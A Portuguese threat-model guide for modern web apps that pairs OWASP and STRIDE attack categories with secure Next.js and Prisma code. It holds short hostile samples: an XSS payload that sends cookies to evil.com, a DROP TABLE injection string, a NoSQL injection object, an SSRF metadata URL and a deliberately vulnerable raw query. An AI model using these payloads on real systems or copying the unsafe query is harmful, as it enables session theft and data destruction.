---
id: doc-threat-model
title: Modelo de Ameaças para Aplicações Web
version: 2.0
last_updated: 2026-04-07
category: security
priority: critical
related:
  - docs/web-excellence/security/01_SECURITY_CHECKLIST.md
  - docs/web-excellence/security/03_AUTH_SECURITY.md
---

# Modelo de Ameaças para Aplicações Web

## Visão Geral

Threat modeling identifica o que pode dar errado antes de dar errado. Baseado no OWASP Top 10 (2025), STRIDE methodology, e dados de incidentes reais, este documento cataloga as ameaças mais relevantes para aplicações web modernas (Next.js + API + Database) com mitigações práticas.

---

## 1. Cross-Site Scripting (XSS)

### 1.1 Tipos

| Tipo | Vetor | Persistência | Gravidade |
|------|-------|-------------|-----------|
| **Reflected** | URL params, query strings | Não (por request) | Alta |
| **Stored** | DB (comments, profiles) | Sim (afeta todos) | Crítica |
| **DOM-based** | Client-side JS manipulation | Não | Alta |

### 1.2 Mitigações

| Mitigação | Tipo Prevenido | Implementação |
|-----------|---------------|---------------|
| **CSP com nonce** | Todos | Header CSP + nonce por request |
| **React auto-escaping** | Reflected, Stored | Default do JSX (não usar `dangerouslySetInnerHTML`) |
| **Sanitização de input** | Stored | DOMPurify para rich text |
| **HttpOnly cookies** | Session theft via XSS | `Set-Cookie: HttpOnly; Secure; SameSite=Strict` |
| **Validação server-side** | Todos | Zod schemas para todo input |

### 1.3 Cenário de Ataque

```
1. Atacante injeta <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
   em campo de comentário
2. Vítima visita a página com o comentário
3. Script executa no contexto da vítima
4. Cookies de sessão enviados para o atacante

Mitigação: 
- HttpOnly cookie (script não acessa)
- CSP bloqueia conexão com evil.com
- Sanitização no input previne injeção
```

---

## 2. Cross-Site Request Forgery (CSRF)

### 2.1 Como Funciona

```
1. Vítima está autenticada no app (cookie de sessão ativo)
2. Vítima visita site malicioso
3. Site malicioso faz request para o app da vítima
4. Browser envia cookie automaticamente
5. App aceita o request como legítimo
```

### 2.2 Mitigações

| Mitigação | Eficácia | Implementação |
|-----------|---------|---------------|
| **SameSite=Strict cookies** | Alta | Cookie não enviado em cross-origin requests |
| **CSRF token** | Alta | Token único por sessão, validado no server |
| **Verificar Origin header** | Média | Rejeitar requests de origins não permitidos |
| **Double submit cookie** | Média | Cookie + header devem coincidir |

### 2.3 Implementação

```tsx
// SameSite=Strict resolve 90%+ dos casos de CSRF
// Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/

// Para APIs que aceitam requests de outros domínios:
export async function POST(request: Request) {
  const origin = request.headers.get('origin')
  if (!allowedOrigins.includes(origin)) {
    return new Response('Forbidden', { status: 403 })
  }
  // Process request...
}
```

---

## 3. SQL/NoSQL Injection

### 3.1 Tipos

| Tipo | Alvo | Exemplo |
|------|------|---------|
| SQL Injection | Databases SQL | `'; DROP TABLE users; --` |
| NoSQL Injection | MongoDB, etc. | `{ "$gt": "" }` como password |
| ORM Injection | ORMs com raw queries | Template literals em queries |

### 3.2 Mitigações

| Mitigação | Eficácia | Implementação |
|-----------|---------|---------------|
| **ORM (Prisma)** | Muito Alta | Queries parametrizadas automaticamente |
| **Prepared statements** | Muito Alta | Para raw SQL quando necessário |
| **Input validation** | Alta | Zod schemas com tipos estritos |
| **Principle of least privilege** | Alta | DB user com mínimo de permissões |
| **Nunca concatenar strings em queries** | Crítico | Sempre usar parametrização |

### 3.3 Prisma (Seguro por Padrão)

```tsx
// ✅ SEGURO — Prisma parametriza automaticamente
const user = await prisma.user.findUnique({
  where: { email: userInput },
})

// ✅ SEGURO — Raw query parametrizada
const users = await prisma.$queryRaw`
  SELECT * FROM users WHERE email = ${userInput}
`

// ❌ VULNERÁVEL — String concatenation
const users = await prisma.$queryRawUnsafe(
  `SELECT * FROM users WHERE email = '${userInput}'`
)
```

---

## 4. Authentication Bypass

### 4.1 Vetores de Ataque

| Vetor | Descrição | Mitigação |
|-------|-----------|-----------|
| Credential stuffing | Tentar credenciais vazadas | Rate limiting + MFA |
| Brute force | Tentar todas as combinações | Account lockout + rate limiting |
| Session fixation | Forçar session ID conhecido | Regenerar session após login |
| JWT tampering | Modificar payload do JWT | Validar assinatura server-side |
| Password reset abuse | Resetar senha de outros | Token único, curta expiração, usar email |
| OAuth hijacking | Interceptar redirect | Validar state parameter + PKCE |

### 4.2 Defesa em Profundidade

```
Camada 1: Rate limiting (IP-based, 5 tentativas/5 min)
Camada 2: Account lockout (15 min após 10 falhas)
Camada 3: MFA para contas privilegiadas
Camada 4: Monitoramento de anomalias (login de novo IP/device)
Camada 5: Session management (timeout, invalidação)
```

---

## 5. Session Hijacking

### 5.1 Vetores

| Vetor | Como | Mitigação |
|-------|------|-----------|
| XSS (roubar cookie) | `document.cookie` | HttpOnly cookies |
| Network sniffing | Interceptar tráfego HTTP | HTTPS + HSTS |
| Session fixation | Forçar session ID | Regenerar ID após login |
| Predictable session ID | Adivinhar ID | Cryptographically random IDs |
| Cross-site cookie theft | SameSite bypass | SameSite=Strict |

### 5.2 Configuração Segura de Cookie

```tsx
const sessionCookie = {
  name: '__session',
  httpOnly: true,
  secure: true,
  sameSite: 'strict' as const,
  path: '/',
  maxAge: 60 * 60 * 24 * 7, // 7 dias
  domain: '.meuapp.com',
}
```

---

## 6. Clickjacking

### 6.1 Como Funciona

```
1. Atacante cria página com iframe invisível apontando para o app
2. Botão "ganhe um prêmio!" posicionado exatamente sobre o botão "deletar conta"
3. Vítima clica pensando que é o prêmio, mas clica "deletar conta"
```

### 6.2 Mitigações

| Mitigação | Implementação |
|-----------|---------------|
| `X-Frame-Options: DENY` | Header HTTP (previne iframe) |
| `frame-ancestors 'none'` | CSP directive (mais moderno) |
| Frame-busting JS | `if (window !== window.top) window.top.location = window.location` |

---

## 7. CORS Misconfiguration

### 7.1 Configurações Perigosas

| Configuração | Risco | Correto |
|-------------|-------|---------|
| `Access-Control-Allow-Origin: *` | Qualquer site pode acessar | Listar origins específicas |
| Refletir Origin do request | Same as wildcard | Validar contra allowlist |
| `credentials: true` com wildcard | Cookie enviado para qualquer um | NUNCA — violação de spec |

### 7.2 Implementação Segura

```tsx
const ALLOWED_ORIGINS = new Set([
  'https://meuapp.com',
  'https://app.meuapp.com',
])

export function corsHeaders(request: Request) {
  const origin = request.headers.get('origin') || ''
  if (!ALLOWED_ORIGINS.has(origin)) return {}

  return {
    'Access-Control-Allow-Origin': origin,
    'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE',
    'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    'Access-Control-Allow-Credentials': 'true',
    'Access-Control-Max-Age': '86400',
  }
}
```

---

## 8. Server-Side Request Forgery (SSRF)

### 8.1 Como Funciona

```
1. App aceita URL do usuário (ex: "importar de URL", "webhook URL")
2. Atacante passa URL interna: http://169.254.169.254/metadata (AWS metadata)
3. Server faz request para URL interna, vaza credenciais
```

### 8.2 Mitigações

| Mitigação | Implementação |
|-----------|---------------|
| Allowlist de domínios | Só permitir domínios conhecidos |
| Bloquear IPs privados | Rejeitar 10.x, 172.16.x, 192.168.x, 127.x, 169.254.x |
| Resolver DNS e validar IP | DNS rebinding protection |
| Timeout curto | max 5s para requests externos |
| Não seguir redirects | Ou validar destino do redirect |

---

## 9. Insecure Direct Object References (IDOR)

### 9.1 Como Funciona

```
GET /api/invoices/123  → Retorna fatura do usuário A
GET /api/invoices/124  → Retorna fatura do usuário B (se não verificar permissão!)
```

### 9.2 Mitigações

| Mitigação | Implementação |
|-----------|---------------|
| **Verificação de ownership** | Sempre verificar se recurso pertence ao usuário |
| **UUIDs em vez de IDs sequenciais** | Mais difícil de adivinhar |
| **Middleware de autorização** | Verificar permissão em toda rota |

```tsx
export async function GET(request: Request, { params }: { params: { id: string } }) {
  const session = await getSession()
  if (!session) return new Response('Unauthorized', { status: 401 })

  const invoice = await prisma.invoice.findUnique({
    where: {
      id: params.id,
      userId: session.user.id,
    },
  })

  if (!invoice) return new Response('Not Found', { status: 404 })
  return Response.json(invoice)
}
```

---

## 10. File Upload Vulnerabilities

### 10.1 Vetores

| Vetor | Risco | Mitigação |
|-------|-------|-----------|
| Upload de arquivo executável | RCE (Remote Code Execution) | Validar tipo + renomear |
| Upload de arquivo muito grande | DoS | Limite de tamanho |
| Path traversal no nome | Sobrescrever arquivos | Sanitizar nome, gerar UUID |
| MIME type spoofing | Bypass de validação | Verificar magic bytes + extensão |
| SVG com script | XSS via imagem | Sanitizar SVGs ou rejeitar |

### 10.2 Implementação Segura

```tsx
const ALLOWED_TYPES = new Set(['image/jpeg', 'image/png', 'image/webp', 'image/avif'])
const MAX_SIZE = 5 * 1024 * 1024 // 5MB

export async function POST(request: Request) {
  const formData = await request.formData()
  const file = formData.get('file') as File

  if (!file) return Response.json({ error: 'No file' }, { status: 400 })
  if (file.size > MAX_SIZE) return Response.json({ error: 'File too large' }, { status: 400 })
  if (!ALLOWED_TYPES.has(file.type)) return Response.json({ error: 'Invalid type' }, { status: 400 })

  const buffer = Buffer.from(await file.arrayBuffer())
  const magicBytes = buffer.subarray(0, 4).toString('hex')
  if (!isValidImageMagicBytes(magicBytes)) {
    return Response.json({ error: 'Invalid file content' }, { status: 400 })
  }

  const fileName = `${crypto.randomUUID()}.${getExtension(file.type)}`
  // Upload para storage com nome seguro
}
```

---

## Matriz de Risco (STRIDE)

| Ameaça | S | T | R | I | D | E | Prioridade |
|--------|---|---|---|---|---|---|-----------|
| XSS | ✅ | ✅ | | ✅ | | ✅ | 🔴 Crítico |
| CSRF | ✅ | | ✅ | | | | 🔴 Crítico |
| SQLi | ✅ | ✅ | | ✅ | ✅ | ✅ | 🔴 Crítico |
| Auth Bypass | ✅ | | ✅ | ✅ | | ✅ | 🔴 Crítico |
| IDOR | | | ✅ | ✅ | | | 🟡 Alto |
| SSRF | | | | ✅ | | | 🟡 Alto |
| Clickjacking | ✅ | | ✅ | | | | 🟡 Alto |
| File Upload | ✅ | ✅ | | | ✅ | | 🟡 Alto |

**STRIDE:** Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege

---

## Fontes e Referências

- OWASP Top 10 (2025)
- OWASP ASVS (Application Security Verification Standard) v4.0
- STRIDE Threat Modeling — Microsoft
- Verizon DBIR 2025
- PortSwigger Web Security Academy
- HackerOne Vulnerability Reports
